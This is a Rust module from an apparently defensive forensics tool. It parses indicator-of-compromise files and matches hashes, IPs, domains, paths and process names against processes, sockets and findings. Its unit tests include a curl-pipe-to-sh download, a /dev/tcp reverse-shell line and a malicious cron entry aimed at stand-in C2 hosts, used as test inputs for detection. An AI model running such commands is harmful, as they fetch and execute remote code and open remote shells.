//! Indicators of compromise supplied by the analyst (`--ioc FILE`). Exhume ships no IOC data; the
//! files are plain text, one indicator per line with an optional description:
//!
//! ```text
//! # comment
//! 44d88612fea8a8f36de82e1278abb02f;EICAR test file
//! 203.0.113.0/24;C2 range
//! evil.example.com;C2 domain
//! /usr/lib/libgcwrap.so;dropped library
//! kworkerds;miner process name
//! ```
//!
//! The type is inferred: 32/40/64 hex digits are MD5/SHA-1/SHA-256 hashes, IPv4/IPv6 addresses and
//! CIDR ranges are network indicators, absolute paths are file paths (`*` matches any run of
//! characters), names with a dot are domains and anything else is a file or process name.
//! `;`, a tab or `,` separate the description.

use std::collections::{BTreeMap, HashMap};
use std::net::IpAddr;

use super::netrules::SocketRow;
use super::report::{Category, Finding, Severity};
use super::ProcInfo;

#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Hash)]
pub enum Kind {
    Md5,
    Sha1,
    Sha256,
    Ip,
    Domain,
    Path,
    Name,
}

impl Kind {
    pub fn label(self) -> &'static str {
        match self {
            Kind::Md5 => "MD5",
            Kind::Sha1 => "SHA-1",
            Kind::Sha256 => "SHA-256",
            Kind::Ip => "IP",
            Kind::Domain => "domain",
            Kind::Path => "path",
            Kind::Name => "name",
        }
    }
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Ioc {
    pub kind: Kind,
    /// Lower-cased for hashes and domains.
    pub value: String,
    pub desc: String,
    /// File the indicator came from, and line.
    pub origin: String,
}

#[derive(Debug, Default, Clone)]
pub struct IocSet {
    pub iocs: Vec<Ioc>,
    /// Lines that could not be parsed: (origin, line).
    pub rejected: Vec<(String, String)>,
    hashes: HashMap<String, usize>,
    ips: Vec<(IpAddr, u8, usize)>,
}

fn classify(v: &str) -> Option<(Kind, String)> {
    let hex = v.chars().all(|c| c.is_ascii_hexdigit());
    match v.len() {
        32 if hex => return Some((Kind::Md5, v.to_ascii_lowercase())),
        40 if hex => return Some((Kind::Sha1, v.to_ascii_lowercase())),
        64 if hex => return Some((Kind::Sha256, v.to_ascii_lowercase())),
        _ => {}
    }
    if parse_net(v).is_some() {
        return Some((Kind::Ip, v.to_string()));
    }
    if v.starts_with('/') {
        return Some((Kind::Path, v.to_string()));
    }
    if v.contains('/') || v.contains(char::is_whitespace) {
        return None;
    }
    // Defanged notation: evil[.]com
    let d = v.replace("[.]", ".").to_ascii_lowercase();
    let label_ok = |l: &str| {
        !l.is_empty()
            && l.len() <= 63
            && l.chars()
                .all(|c| c.is_ascii_alphanumeric() || c == '-' || c == '_')
    };
    let labels: Vec<&str> = d.trim_end_matches('.').split('.').collect();
    if labels.len() >= 2
        && labels.iter().all(|l| label_ok(l))
        && labels
            .last()
            .is_some_and(|t| t.chars().all(|c| c.is_ascii_alphabetic()))
    {
        return Some((Kind::Domain, d.trim_end_matches('.').to_string()));
    }
    (!v.is_empty() && v.len() <= 255).then(|| (Kind::Name, v.to_string()))
}

/// `a.b.c.d`, `a.b.c.d/n`, IPv6 and IPv6 CIDR (defanged dots accepted).
fn parse_net(v: &str) -> Option<(IpAddr, u8)> {
    let v = v.replace("[.]", ".");
    let (a, p) = match v.split_once('/') {
        Some((a, p)) => (a.to_string(), Some(p.parse::<u8>().ok()?)),
        None => (v.clone(), None),
    };
    let ip: IpAddr = a.trim_matches(|c| c == '[' || c == ']').parse().ok()?;
    let max = if ip.is_ipv4() { 32 } else { 128 };
    let p = p.unwrap_or(max);
    (p <= max).then_some((ip, p))
}

fn in_net(ip: IpAddr, net: IpAddr, prefix: u8) -> bool {
    let ip = match ip {
        IpAddr::V6(v6) => v6.to_ipv4_mapped().map(IpAddr::V4).unwrap_or(ip),
        v4 => v4,
    };
    match (ip, net) {
        (IpAddr::V4(a), IpAddr::V4(n)) => {
            let m = if prefix == 0 {
                0
            } else {
                u32::MAX << (32 - prefix)
            };
            u32::from(a) & m == u32::from(n) & m
        }
        (IpAddr::V6(a), IpAddr::V6(n)) => {
            let m = if prefix == 0 {
                0
            } else {
                u128::MAX << (128 - prefix)
            };
            u128::from(a) & m == u128::from(n) & m
        }
        _ => false,
    }
}

/// `*` wildcard match over the whole string.
pub fn glob(pat: &str, s: &str) -> bool {
    let parts: Vec<&str> = pat.split('*').collect();
    if parts.len() == 1 {
        return pat == s;
    }
    let mut rest = s;
    for (i, p) in parts.iter().enumerate() {
        if i == 0 {
            let Some(r) = rest.strip_prefix(p) else {
                return false;
            };
            rest = r;
        } else if i == parts.len() - 1 {
            return rest.ends_with(p);
        } else {
            let Some(j) = rest.find(p) else { return false };
            rest = &rest[j + p.len()..];
        }
    }
    true
}

impl IocSet {
    pub fn add_text(&mut self, origin: &str, text: &str) {
        for (n, raw) in text.lines().enumerate() {
            let line = raw.trim();
            if line.is_empty() || line.starts_with('#') || line.starts_with("//") {
                continue;
            }
            let (v, desc) = match line.find([';', '\t', ',']) {
                Some(i) => (line[..i].trim(), line[i + 1..].trim()),
                None => (line, ""),
            };
            match classify(v) {
                Some((kind, value)) => {
                    let i = self.iocs.len();
                    match kind {
                        Kind::Md5 | Kind::Sha1 | Kind::Sha256 => {
                            self.hashes.insert(value.clone(), i);
                        }
                        Kind::Ip => {
                            if let Some((ip, p)) = parse_net(&value) {
                                self.ips.push((ip, p, i));
                            }
                        }
                        _ => {}
                    }
                    self.iocs.push(Ioc {
                        kind,
                        value,
                        desc: desc.to_string(),
                        origin: format!("{origin}:{}", n + 1),
                    });
                }
                None => self
                    .rejected
                    .push((format!("{origin}:{}", n + 1), raw.to_string())),
            }
        }
    }

    pub fn is_empty(&self) -> bool {
        self.iocs.is_empty()
    }

    pub fn wants_hashes(&self) -> bool {
        !self.hashes.is_empty()
    }

    /// Which hash algorithms the set uses (so only those are computed).
    pub fn hash_kinds(&self) -> (bool, bool, bool) {
        let has = |k| self.iocs.iter().any(|i| i.kind == k);
        (has(Kind::Md5), has(Kind::Sha1), has(Kind::Sha256))
    }

    pub fn counts(&self) -> BTreeMap<&'static str, usize> {
        let mut m = BTreeMap::new();
        for i in &self.iocs {
            *m.entry(i.kind.label()).or_default() += 1;
        }
        m
    }

    pub fn by_kind(&self, k: Kind) -> impl Iterator<Item = &Ioc> {
        self.iocs.iter().filter(move |i| i.kind == k)
    }

    pub fn hash(&self, h: &str) -> Option<&Ioc> {
        self.hashes
            .get(&h.to_ascii_lowercase())
            .map(|&i| &self.iocs[i])
    }

    pub fn ip(&self, addr: &str) -> Option<&Ioc> {
        let ip: IpAddr = addr.trim_matches(|c| c == '[' || c == ']').parse().ok()?;
        self.ips
            .iter()
            .find(|(n, p, _)| in_net(ip, *n, *p))
            .map(|&(_, _, i)| &self.iocs[i])
    }

    /// Domain indicators found in free text (subdomains match too).
    pub fn domains_in<'a>(&'a self, text: &str) -> Vec<&'a Ioc> {
        let t = text.to_ascii_lowercase();
        self.by_kind(Kind::Domain)
            .filter(|i| {
                t.match_indices(i.value.as_str()).any(|(at, _)| {
                    let before = t[..at].chars().next_back();
                    let after = t[at + i.value.len()..].chars().next();
                    let edge = |c: Option<char>| {
                        c.is_none_or(|c| !(c.is_ascii_alphanumeric() || c == '-' || c == '_'))
                    };
                    (edge(before) || before == Some('.')) && edge(after)
                })
            })
            .collect()
    }

    /// IP indicators (exact addresses only) found in free text.
    pub fn ips_in<'a>(&'a self, text: &str) -> Vec<&'a Ioc> {
        text.split(|c: char| !(c.is_ascii_hexdigit() || c == '.' || c == ':'))
            .filter(|w| w.len() >= 7 && w.contains('.'))
            .filter_map(|w| self.ip(w.trim_matches(':')))
            .collect()
    }

    pub fn path(&self, p: &str) -> Option<&Ioc> {
        self.by_kind(Kind::Path).find(|i| glob(&i.value, p))
    }

    pub fn name(&self, n: &str) -> Option<&Ioc> {
        self.by_kind(Kind::Name).find(|i| glob(&i.value, n))
    }
}

pub fn finding(ioc: &Ioc, sev: Severity, cat: Category, what: &str) -> Finding {
    let mut f = Finding::new(
        sev,
        cat,
        format!("IOC match ({}): {what}", ioc.kind.label()),
    )
    .detail(format!("indicator: {}", ioc.value));
    if !ioc.desc.is_empty() {
        f = f.detail(format!("description: {}", ioc.desc));
    }
    f.detail(format!("from {}", ioc.origin))
}

/// Process and network matches: executable path/name, command line domains and IPs, sockets.
pub fn process_findings(set: &IocSet, procs: &[ProcInfo], sockets: &[SocketRow]) -> Vec<Finding> {
    let mut out = Vec::new();
    for p in procs.iter().filter(|p| !p.kthread) {
        let exe = p.exe.as_deref().map(|e| e.trim_end_matches(" (deleted)"));
        if let Some(i) = exe.and_then(|e| set.path(e)) {
            out.push(
                finding(
                    i,
                    Severity::Critical,
                    Category::Process,
                    &format!("running executable {}", exe.unwrap_or("?")),
                )
                .proc(p.pid, &p.comm),
            );
        }
        let base = exe.and_then(|e| e.rsplit('/').next());
        let argv0 = p.argv.first().map(|a| a.rsplit('/').next().unwrap_or(a));
        if let Some(i) = [base, argv0, Some(p.comm.as_str())]
            .into_iter()
            .flatten()
            .find_map(|n| set.name(n))
        {
            out.push(
                finding(
                    i,
                    Severity::High,
                    Category::Process,
                    &format!("process name {}", p.comm),
                )
                .proc(p.pid, &p.comm)
                .detail(format!("exe: {}", exe.unwrap_or("?"))),
            );
        }
        let cmd = p.cmdline();
        for i in set.domains_in(&cmd).into_iter().chain(set.ips_in(&cmd)) {
            out.push(
                finding(
                    i,
                    Severity::High,
                    Category::Process,
                    "indicator in a process command line",
                )
                .proc(p.pid, &p.comm)
                .detail(format!(
                    "cmdline: {}",
                    cmd.chars().take(300).collect::<String>()
                )),
            );
        }
    }
    for s in sockets {
        let Some((addr, _)) = s.remote.rsplit_once(':') else {
            continue;
        };
        if s.remote_port == 0 {
            continue;
        }
        if let Some(i) = set.ip(addr) {
            let mut f = finding(
                i,
                Severity::Critical,
                Category::Network,
                &format!("connection to {}", s.remote),
            )
            .detail(s.summary());
            if let (Some(pid), Some(n)) = (s.pid, s.process.as_deref()) {
                f = f.proc(pid, n);
            }
            out.push(f);
        }
    }
    out
}

/// Indicators found in the text of other findings (persistence entries, scripts, configs).
pub fn text_findings(set: &IocSet, findings: &[Finding]) -> Vec<Finding> {
    let mut out = Vec::new();
    for f in findings
        .iter()
        .filter(|f| !f.title.starts_with("IOC match"))
    {
        let text = format!("{} {}", f.title, f.details.join(" "));
        for i in set.domains_in(&text).into_iter().chain(set.ips_in(&text)) {
            let mut n = finding(
                i,
                Severity::High,
                f.category,
                &format!("in \"{}\"", f.title),
            )
            .mitre(&[]);
            if let Some(p) = &f.path {
                n = n.path(p.clone());
            }
            if let (Some(pid), Some(name)) = (f.pid, f.process.as_deref()) {
                n = n.proc(pid, name);
            }
            out.push(n);
        }
    }
    out
}

#[cfg(test)]
mod tests {
    use super::*;

    const IOCS: &str = "\
# test set
44D88612FEA8A8F36DE82E1278ABB02F;EICAR
3395856ce81f2b7382dee72602f798b642f14140,eicar sha1
275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f\teicar sha256
203.0.113.0/24;C2 range
2001:db8::1;v6 c2
evil[.]example.com;C2 domain
/usr/lib/libgc*.so;dropped library
kworkerds;miner
not a valid indicator here
";

    fn set() -> IocSet {
        let mut s = IocSet::default();
        s.add_text("t.txt", IOCS);
        s
    }

    #[test]
    fn parses_types() {
        let s = set();
        assert_eq!(s.iocs.len(), 8);
        assert_eq!(s.rejected.len(), 1);
        assert_eq!(s.iocs[0].kind, Kind::Md5);
        assert_eq!(s.iocs[5].kind, Kind::Domain);
        assert_eq!(s.iocs[5].value, "evil.example.com");
        assert_eq!(s.iocs[7].kind, Kind::Name);
        assert_eq!(s.iocs[2].desc, "eicar sha256");
        assert_eq!(s.iocs[3].origin, "t.txt:5");
        assert_eq!(s.hash_kinds(), (true, true, true));
    }

    #[test]
    fn matching() {
        let s = set();
        assert!(s.hash("44d88612fea8a8f36de82e1278abb02f").is_some());
        assert!(s.ip("203.0.113.77").is_some());
        assert!(s.ip("[::ffff:203.0.113.77]").is_some());
        assert!(s.ip("203.0.114.1").is_none());
        assert!(s.ip("[2001:db8::1]").is_some());
        assert_eq!(
            s.domains_in("curl http://cdn.evil.example.com/x | sh")
                .len(),
            1
        );
        assert!(s.domains_in("notevil.example.com").is_empty());
        assert!(s.domains_in("evil.example.community").is_empty());
        assert_eq!(
            s.ips_in("bash -i >& /dev/tcp/203.0.113.5/4444 0>&1").len(),
            1
        );
        assert!(s.path("/usr/lib/libgcwrap.so").is_some());
        assert!(s.path("/usr/lib/libc.so").is_none());
        assert!(s.name("kworkerds").is_some());
        assert!(glob("a*b*c", "axxbyyc") && !glob("a*b*c", "axxbyy"));
    }

    #[test]
    fn process_and_socket_matches() {
        let s = set();
        let p = ProcInfo {
            pid: 10,
            comm: "kworkerds".into(),
            argv: vec![
                "/tmp/kworkerds".into(),
                "-o".into(),
                "pool.evil.example.com:3333".into(),
            ],
            exe: Some("/tmp/kworkerds (deleted)".into()),
            ..Default::default()
        };
        let sock = SocketRow {
            proto: "tcp".into(),
            local: "10.0.0.2:5000".into(),
            remote: "203.0.113.9:443".into(),
            state: "ESTABLISHED".into(),
            pid: Some(10),
            process: Some("kworkerds".into()),
            remote_port: 443,
            ..Default::default()
        };
        let f = process_findings(&s, &[p], &[sock]);
        assert!(f
            .iter()
            .any(|x| x.title.contains("process name") && x.severity == Severity::High));
        assert!(f.iter().any(|x| x.title.contains("command line")));
        assert!(f
            .iter()
            .any(|x| x.title.contains("connection to 203.0.113.9:443")
                && x.severity == Severity::Critical));
    }

    #[test]
    fn text_matches() {
        let s = set();
        let f = Finding::new(Severity::Medium, Category::Persistence, "Cron job: x")
            .path("/etc/cron.d/x")
            .detail("* * * * * root curl -s evil.example.com/a|sh");
        let out = text_findings(&s, &[f]);
        assert_eq!(out.len(), 1);
        assert_eq!(out[0].path.as_deref(), Some("/etc/cron.d/x"));
        assert_eq!(out[0].category, Category::Persistence);
    }
}
